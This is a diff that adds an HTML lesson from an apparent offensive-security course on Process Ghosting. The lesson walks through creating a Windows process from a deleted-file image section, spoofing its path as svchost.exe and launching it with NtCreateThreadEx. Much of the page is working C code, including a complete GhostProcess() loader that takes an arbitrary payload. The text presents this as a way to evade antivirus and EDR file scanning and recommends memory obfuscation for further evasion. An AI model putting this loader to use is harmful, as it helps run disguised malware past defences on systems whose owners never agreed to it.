@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 6: Process & Thread Creation - ProcessGhosting Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F4A8;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#6366f1;--accent2:#4f46e5;--gradient:linear-gradient(135deg,#6366f1,#4f46e5)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>ProcessGhosting</h2>
+<span>Ghost Process Evasion</span>
+</div>
+<a class="home-link" href="../ProcessGhosting_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Process Creation Internals</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. PE Tampering Overview</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. File States &amp; Delete-Pending</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. Creating the Ghost File</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. Section Mapping from Ghost</span><span class="diff d2">d2</span></a>
+<a class="mod-link active" href="module6.html"><span>6. Process &amp; Thread Creation</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. AV/EDR Scan Timing</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge med">Difficulty: Intermediate</span>
+<h1>Module 6: Process &amp; Thread Creation</h1>
+<p class="subtitle">Bringing the ghost to life &mdash; NtCreateProcessEx, PEB setup, process parameters, and NtCreateThreadEx to start execution.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Implement the final phase of Process Ghosting: creating a process from the ghost section handle using <code>NtCreateProcessEx</code>, setting up process parameters with <code>RtlCreateProcessParametersEx</code>, writing them into the target process, and creating the initial thread with <code>NtCreateThreadEx</code>. By the end of this module, the ghost process is running.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Step 1: Creating the Process Object</h2>
+
+<p>With the image section handle from Module 5, we create a process. <code>NtCreateProcessEx</code> creates an <code>EPROCESS</code> object and maps the section into a new address space:</p>
+
+<pre><code>HANDLE hProcess = NULL;
+
+NTSTATUS status = NtCreateProcessEx(
+    &hProcess,              // output: process handle
+    PROCESS_ALL_ACCESS,     // desired access
+    NULL,                   // object attributes
+    NtCurrentProcess(),     // parent process handle
+    0,                      // flags (0 = inherit nothing)
+    hSection,               // THE GHOST SECTION
+    NULL,                   // debug port
+    NULL,                   // exception port
+    FALSE                   // InJob
+);</code></pre>
+
+<div class="card">
+<h4>NtCreateProcessEx Parameters</h4>
+<table>
+<tr><th>Parameter</th><th>Value</th><th>Purpose</th></tr>
+<tr><td><code>ProcessHandle</code></td><td><code>&hProcess</code></td><td>Receives the handle to the new process</td></tr>
+<tr><td><code>DesiredAccess</code></td><td><code>PROCESS_ALL_ACCESS</code></td><td>Full access &mdash; we need to write memory and create threads</td></tr>
+<tr><td><code>ObjectAttributes</code></td><td><code>NULL</code></td><td>No special naming or inheritance</td></tr>
+<tr><td><code>ParentProcess</code></td><td><code>NtCurrentProcess()</code></td><td>Our process is the parent. This affects token inheritance and process tree.</td></tr>
+<tr><td><code>Flags</code></td><td><code>0</code></td><td>No special flags (no handle inheritance, etc.)</td></tr>
+<tr><td><code>SectionHandle</code></td><td><code>hSection</code></td><td>The ghost image section &mdash; this is what gets mapped into the process</td></tr>
+<tr><td><code>DebugPort</code></td><td><code>NULL</code></td><td>No debugger attached</td></tr>
+<tr><td><code>ExceptionPort</code></td><td><code>NULL</code></td><td>No exception port</td></tr>
+<tr><td><code>InJob</code></td><td><code>FALSE</code></td><td>Do not create in a job object</td></tr>
+</table>
+</div>
+
+<p>After this call, the kernel has created a new process with the ghost image mapped into its virtual address space. The process has a PEB, an address space, and <code>ntdll.dll</code> mapped. But it has no threads &mdash; it is not executing.</p>
+
+<!-- ============================================================ -->
+<h2>2. Reading Process Information</h2>
+
+<p>Before setting up parameters, we need to find the PEB address and the image entry point in the new process:</p>
+
+<pre><code>// Get the PEB address of the new process
+PROCESS_BASIC_INFORMATION pbi = { 0 };
+ULONG retLen = 0;
+
+status = NtQueryInformationProcess(
+    hProcess,
+    ProcessBasicInformation,
+    &pbi,
+    sizeof(pbi),
+    &retLen
+);
+
+PPEB pRemotePEB = pbi.PebBaseAddress;
+
+// Read the image base from the remote PEB
+PVOID imageBase = NULL;
+SIZE_T bytesRead = 0;
+
+// PEB.ImageBaseAddress is at offset 0x10 (x64)
+ReadProcessMemory(
+    hProcess,
+    (PBYTE)pRemotePEB + offsetof(PEB, ImageBaseAddress),
+    &imageBase,
+    sizeof(imageBase),
+    &bytesRead
+);</code></pre>
+
+<p>We also need the entry point address, which we can get from the section information we queried in Module 5, or by reading the PE headers from the mapped image:</p>
+
+<pre><code>// Get entry point from section image information
+SECTION_IMAGE_INFORMATION imageInfo = { 0 };
+NtQuerySection(hSection, SectionImageInformation,
+    &imageInfo, sizeof(imageInfo), NULL);
+
+// Entry point absolute address
+PVOID entryPoint = imageInfo.TransferAddress;
+
+// Alternative: read from mapped PE headers
+// DWORD epRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
+// PVOID entryPoint = (PBYTE)imageBase + epRVA;</code></pre>
+
+<!-- ============================================================ -->
+<h2>3. Step 2: Creating Process Parameters</h2>
+
+<p>Every Windows process needs <code>RTL_USER_PROCESS_PARAMETERS</code> &mdash; this structure contains the command line, image path, environment variables, current directory, standard handles, and window information. Without it, the process will crash during loader initialization.</p>
+
+<pre><code>// Create process parameters
+UNICODE_STRING imagePath;
+UNICODE_STRING commandLine;
+UNICODE_STRING currentDir;
+
+// Use a legitimate-looking image path
+// This is what appears in Process Explorer, tasklist, etc.
+RtlInitUnicodeString(&imagePath,
+    L"C:\\Windows\\System32\\svchost.exe");
+RtlInitUnicodeString(&commandLine,
+    L"C:\\Windows\\System32\\svchost.exe");
+RtlInitUnicodeString(&currentDir,
+    L"C:\\Windows\\System32");
+
+PRTL_USER_PROCESS_PARAMETERS processParams = NULL;
+UNICODE_STRING dllPath;
+RtlInitUnicodeString(&dllPath,
+    L"C:\\Windows\\System32");
+
+status = RtlCreateProcessParametersEx(
+    &processParams,
+    &imagePath,         // ImagePathName
+    &dllPath,           // DllPath
+    &currentDir,        // CurrentDirectory
+    &commandLine,       // CommandLine
+    NULL,               // Environment (inherit)
+    NULL,               // WindowTitle
+    NULL,               // DesktopInfo
+    NULL,               // ShellInfo
+    NULL,               // RuntimeData
+    RTL_USER_PROC_PARAMS_NORMALIZED  // flags
+);</code></pre>
+
+<div class="card green">
+<h4>RTL_USER_PROC_PARAMS_NORMALIZED</h4>
+<p>The <code>RTL_USER_PROC_PARAMS_NORMALIZED</code> flag tells the runtime to create the parameters with absolute pointers (normalized) rather than offsets from the structure base (denormalized). This is important because we will be writing the structure into a different process&rsquo;s address space, and we need the pointers to be valid in that space.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. Step 3: Writing Parameters into the Target Process</h2>
+
+<p>The process parameters must be written into the target process&rsquo;s memory and the PEB must be updated to point to them:</p>
+
+<pre><code>// Calculate total size of parameters (structure + strings)
+SIZE_T paramSize = processParams->MaximumLength +
+                   processParams->EnvironmentSize;
+
+// Allocate memory in the target process
+PVOID paramBaseAddr = processParams;  // preferred address
+status = NtAllocateVirtualMemory(
+    hProcess,
+    &paramBaseAddr,
+    0,
+    &paramSize,
+    MEM_COMMIT | MEM_RESERVE,
+    PAGE_READWRITE
+);
+
+// Write the parameters into the target process
+SIZE_T bytesWritten = 0;
+WriteProcessMemory(
+    hProcess,
+    paramBaseAddr,
+    processParams,
+    processParams->MaximumLength +
+        processParams->EnvironmentSize,
+    &bytesWritten
+);
+
+// Update the PEB to point to the parameters
+// PEB.ProcessParameters is at a known offset
+WriteProcessMemory(
+    hProcess,
+    (PBYTE)pRemotePEB +
+        offsetof(PEB, ProcessParameters),
+    &paramBaseAddr,
+    sizeof(PVOID),
+    &bytesWritten
+);</code></pre>
+
+<div class="card warn">
+<h4>Address Space Awareness</h4>
+<p>A common pitfall is allocating the process parameters at an arbitrary address. If the parameters use normalized (absolute) pointers, those pointers must be valid in the target process. The safest approach is to allocate at the same address in the target as in the current process, or re-normalize the pointers after allocation.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>5. Step 4: Creating the Initial Thread</h2>
+
+<p>The final step is creating a thread in the ghost process that begins execution at the PE entry point:</p>
+
+<pre><code>HANDLE hThread = NULL;
+
+status = NtCreateThreadEx(
+    &hThread,
+    THREAD_ALL_ACCESS,
+    NULL,                   // object attributes
+    hProcess,               // target process
+    (LPTHREAD_START_ROUTINE)entryPoint,  // start address
+    NULL,                   // parameter
+    FALSE,                  // CreateSuspended = FALSE
+    0,                      // ZeroBits
+    0,                      // StackSize (default)
+    0,                      // MaxStackSize (default)
+    NULL                    // AttributeList
+);
+
+if (NT_SUCCESS(status)) {
+    // The ghost process is now RUNNING
+    // The thread starts at the PE entry point
+    // ntdll!LdrInitializeThunk runs first,
+    // processing imports and calling DllMain for loaded DLLs
+}</code></pre>
+
+<div class="card">
+<h4>NtCreateThreadEx Parameters</h4>
+<table>
+<tr><th>Parameter</th><th>Value</th><th>Notes</th></tr>
+<tr><td><code>ThreadHandle</code></td><td><code>&hThread</code></td><td>Output handle</td></tr>
+<tr><td><code>DesiredAccess</code></td><td><code>THREAD_ALL_ACCESS</code></td><td>Full control over the thread</td></tr>
+<tr><td><code>ProcessHandle</code></td><td><code>hProcess</code></td><td>The ghost process</td></tr>
+<tr><td><code>StartRoutine</code></td><td><code>entryPoint</code></td><td>PE AddressOfEntryPoint (absolute address in target)</td></tr>
+<tr><td><code>CreateSuspended</code></td><td><code>FALSE</code></td><td>Thread starts immediately. Set TRUE if you need to modify context first.</td></tr>
+<tr><td><code>StackSize</code></td><td><code>0</code></td><td>Use PE header defaults (<code>SizeOfStackReserve</code> / <code>SizeOfStackCommit</code>)</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<h2>6. What Happens at Thread Start</h2>
+
+<p>When the thread begins execution, it does not jump directly to the application&rsquo;s entry point. The Windows loader takes over first:</p>
+
+<div class="card">
+<h4>Thread Startup Sequence</h4>
+<ol>
+<li><code>ntdll!LdrInitializeThunk</code> &mdash; Entry point set by the kernel for all new threads</li>
+<li><code>ntdll!LdrpInitialize</code> &mdash; Checks if this is the first thread (process initialization needed)</li>
+<li><code>ntdll!LdrpInitializeProcess</code> &mdash; Walks the import table, loads DLLs, resolves imports, processes TLS callbacks</li>
+<li><code>ntdll!LdrpRunInitializeRoutines</code> &mdash; Calls <code>DllMain(DLL_PROCESS_ATTACH)</code> for each loaded DLL</li>
+<li>Control transfers to <code>kernel32!BaseThreadInitThunk</code></li>
+<li>Finally, the application&rsquo;s entry point (<code>main</code>, <code>WinMain</code>, or the CRT entry) executes</li>
+</ol>
+</div>
+
+<p>This means the ghost process goes through the normal Windows loader initialization. Imports are resolved, DLLs are loaded (including any EDR userland DLLs like hooking DLLs), and the process looks fully normal from the loader&rsquo;s perspective.</p>
+
+<!-- ============================================================ -->
+<h2>7. Complete Ghost Process Creation Function</h2>
+
+<pre><code>bool GhostProcess(
+    LPCWSTR ghostFilePath,
+    BYTE* payload, DWORD payloadSize,
+    LPCWSTR spoofedImagePath)
+{
+    HANDLE hSection = NULL;
+    HANDLE hProcess = NULL;
+    HANDLE hThread = NULL;
+    NTSTATUS status;
+
+    // Phase 1 & 2: Ghost file + section (Modules 4-5)
+    if (!CreateGhostSection(ghostFilePath,
+            payload, payloadSize, &hSection)) {
+        return false;
+    }
+
+    // Phase 3: Create process from ghost section
+    status = NtCreateProcessEx(
+        &hProcess, PROCESS_ALL_ACCESS,
+        NULL, NtCurrentProcess(),
+        0, hSection, NULL, NULL, FALSE);
+    if (!NT_SUCCESS(status)) {
+        NtClose(hSection);
+        return false;
+    }
+
+    // Phase 4: Get PEB and entry point
+    PROCESS_BASIC_INFORMATION pbi = { 0 };
+    NtQueryInformationProcess(hProcess,
+        ProcessBasicInformation,
+        &pbi, sizeof(pbi), NULL);
+
+    SECTION_IMAGE_INFORMATION imgInfo = { 0 };
+    NtQuerySection(hSection,
+        SectionImageInformation,
+        &imgInfo, sizeof(imgInfo), NULL);
+
+    // Phase 5: Create and write process parameters
+    UNICODE_STRING imgPath, cmdLine, curDir, dllPath;
+    RtlInitUnicodeString(&imgPath, spoofedImagePath);
+    RtlInitUnicodeString(&cmdLine, spoofedImagePath);
+    RtlInitUnicodeString(&curDir, L"C:\\Windows\\System32");
+    RtlInitUnicodeString(&dllPath, L"C:\\Windows\\System32");
+
+    PRTL_USER_PROCESS_PARAMETERS params = NULL;
+    RtlCreateProcessParametersEx(&params,
+        &imgPath, &dllPath, &curDir, &cmdLine,
+        NULL, NULL, NULL, NULL, NULL,
+        RTL_USER_PROC_PARAMS_NORMALIZED);
+
+    // Write params into target and update PEB
+    WriteParamsToProcess(hProcess,
+        pbi.PebBaseAddress, params);
+
+    // Phase 6: Create initial thread
+    status = NtCreateThreadEx(
+        &hThread, THREAD_ALL_ACCESS,
+        NULL, hProcess,
+        (LPTHREAD_START_ROUTINE)imgInfo.TransferAddress,
+        NULL, FALSE, 0, 0, 0, NULL);
+
+    // Cleanup local resources
+    RtlDestroyProcessParameters(params);
+    NtClose(hSection);
+
+    if (!NT_SUCCESS(status)) {
+        NtTerminateProcess(hProcess, status);
+        NtClose(hProcess);
+        return false;
+    }
+
+    // Ghost process is now running!
+    NtClose(hThread);
+    NtClose(hProcess);
+    return true;
+}</code></pre>
+
+<!-- ============================================================ -->
+<h2>8. Post-Creation State</h2>
+
+<p>After the ghost process is running, here is the system state from various perspectives:</p>
+
+<table>
+<tr><th>Observer</th><th>What They See</th></tr>
+<tr><td><strong>Task Manager / Process Explorer</strong></td><td>A process with the spoofed image path (e.g., <code>svchost.exe</code>). The image name in the PEB matches the spoofed path.</td></tr>
+<tr><td><strong>Kernel (NtQueryInformationProcess)</strong></td><td><code>ProcessImageFileName</code> returns the path of the ghost file (which no longer exists on disk).</td></tr>
+<tr><td><strong>AV file scan</strong></td><td>Cannot scan the backing file &mdash; it does not exist. Attempting to open the path returns <code>STATUS_OBJECT_NAME_NOT_FOUND</code>.</td></tr>
+<tr><td><strong>Memory scan</strong></td><td>The image is in memory and executable. If the AV has signatures for the payload, memory scanning can still detect it.</td></tr>
+<tr><td><strong>ETW / Kernel callbacks</strong></td><td>Process creation callbacks (<code>PsSetCreateProcessNotifyRoutineEx</code>) fire when the first thread is inserted, not at process object creation. By then, the <code>FileObject</code> points to a deleted file.</td></tr>
+</table>
+
+<div class="card highlight">
+<h4>Ghosting Does Not Prevent Memory Scanning</h4>
+<p>Process Ghosting evades <strong>file-based</strong> scanning by eliminating the file. It does not protect against <strong>memory-based</strong> scanning. Once the process is running, its memory can still be scanned by EDR products that do in-memory signature matching. Combining ghosting with memory obfuscation techniques (like sleep obfuscation or per-function masking) provides more comprehensive evasion.</p>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: What is the purpose of RTL_USER_PROCESS_PARAMETERS in the ghost process?</p>
+<div class="quiz-btn" data-choice="A">A) It contains the PE headers for the image</div>
+<div class="quiz-btn" data-choice="B">B) It provides the command line, image path, environment, and other startup information the loader needs</div>
+<div class="quiz-btn" data-choice="C">C) It stores the section handle for the ghost image</div>
+<div class="quiz-btn" data-choice="D">D) It contains the thread context (registers) for the initial thread</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q2: What runs before the application entry point when NtCreateThreadEx starts the initial thread?</p>
+<div class="quiz-btn" data-choice="A">A) The Windows loader (LdrInitializeThunk) processes imports and loads DLLs</div>
+<div class="quiz-btn" data-choice="B">B) The antivirus scanner checks the process memory</div>
+<div class="quiz-btn" data-choice="C">C) The kernel re-validates the PE headers</div>
+<div class="quiz-btn" data-choice="D">D) Nothing &mdash; execution goes directly to the entry point</div>
+</div>
+
+<div class="quiz-q" data-answer="D">
+<p>Q3: What limitation does Process Ghosting have even after successfully creating the ghost process?</p>
+<div class="quiz-btn" data-choice="A">A) The process cannot load DLLs</div>
+<div class="quiz-btn" data-choice="B">B) The process runs with reduced privileges</div>
+<div class="quiz-btn" data-choice="C">C) The process cannot create child processes</div>
+<div class="quiz-btn" data-choice="D">D) The process memory can still be scanned by EDR, so memory-based detection is still possible</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module5.html">&larr; Prev: Section Mapping from Ghost</a>
+<a class="primary" href="module7.html">Next: AV/EDR Scan Timing Window &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
